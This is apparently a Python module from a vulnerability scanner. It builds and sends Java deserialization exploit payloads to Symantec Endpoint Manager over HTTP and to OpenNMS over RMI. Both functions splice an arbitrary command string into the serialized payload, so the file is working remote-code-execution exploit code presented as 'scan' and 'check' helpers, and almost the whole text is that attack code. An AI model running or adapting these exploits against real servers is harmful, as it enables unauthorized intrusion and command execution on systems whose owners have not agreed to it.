from __future__ import annotations

import socket
from typing import Optional, Any

import httpx

from attacks.payloads import (
    symantec_endpoint_attack__payload_1,
    symantec_endpoint_attack__payload_2,
    opennms_attack__payload_1,
    opennms_attack__payload_2,
    opennms_attack__payload_3,
    opennms_attack__payload_4,
)


def scan_symantec(host: str, port: int, protocol: str, cmd: Optional[str] = None) -> bool:
    """
    Exploit Symantec Endpoint Manager deserialization vulnerability.
    """
    if protocol not in {"http", "https"}:
        return False
    if cmd is None:
        cmd = ""

    # Construct Java serialized payload
    java_payload = (
            symantec_endpoint_attack__payload_1
            + chr(len(cmd))
            + cmd
            + symantec_endpoint_attack__payload_2
    )
    boundary = "----=_Part_0_992568364.1449677528532"
    full_payload = (
        f"{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"exploit.ser\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n"
        f"{java_payload}\r\n"
        f"{boundary}--\r\n"
    )
    url = f"{protocol}://{host}:{port}/servlet/EpServlet"
    try:
        response = httpx.post(
            url,
            content=full_payload.encode("iso-8859-1"),
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            timeout=10,
        )
        return response.status_code == 200
    except (httpx.HTTPError, socket.error, socket.timeout):
        return False


def scan_opennms(host: str, port: int, protocol: str, cmd: Optional[str] = None) -> bool:
    """
    Probe OpenNMS RMI deserialization vulnerability.
    """
    if protocol != "rmi":
        return False
    if cmd is None:
        cmd = ""

    try:
        d1 = opennms_attack__payload_1
        d2 = (
                opennms_attack__payload_2
                + opennms_attack__payload_3
                + chr(len(cmd))
                + cmd
                + opennms_attack__payload_4
        )
        with socket.create_connection((host, port), timeout=6) as sock:
            sock.sendall(d1)
            resp = sock.recv(1024)
            if b"JRMI" in resp:
                sock.sendall(d2)
                return True
    except (socket.error, socket.timeout):
        return False
    return False


def full_check_symantec(host: str, port: int, proto: str) -> dict[str, Any]:
    found = scan_symantec(host, port, proto)
    return {
        "service": "Symantec",
        "url": f"{proto}://{host}:{port}",
        "status": "Vulnerability" if found else "Not vulnerability"
    }

def full_check_opennms(host: str, port: int, proto: str) -> dict[str, Any]:
    found = scan_opennms(host, port, proto)
    return {
        "service": "OpenNMS",
        "url": f"{proto}://{host}:{port}",
        "status": "Vulnerability" if found else "Not vulnerability"
    }

__all__ = ["full_check_symantec", "full_check_opennms"]
